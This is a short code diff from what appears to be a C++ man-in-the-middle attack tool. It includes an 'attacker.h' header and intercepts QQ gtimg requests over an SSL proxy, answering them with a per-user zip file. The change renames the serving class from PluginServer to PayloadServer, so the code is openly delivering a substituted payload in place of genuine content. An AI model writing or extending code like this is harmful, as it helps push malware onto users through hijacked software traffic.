@@ -1,5 +1,5 @@
 #include "gtimg.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../attacker.h"
 
 
@@ -22,6 +22,6 @@ int QQigtimg::replyQQigtimg(char*recvBuffer,int len, int buflimit,LPSSLPROXYPARA
 	char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/zip\r\nContent-Length: %u\r\n\r\n";
 
 	string filename = Public::getUserUrl(pstSSLProxyParam->username, QQGTIMG_ZIP_FILENAME);
-	int ret = PluginServer::SendPluginFile(filename.c_str(),pstSSLProxyParam, szHttpRespFormat,1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(),pstSSLProxyParam, szHttpRespFormat,1);
 	return ret;
 }
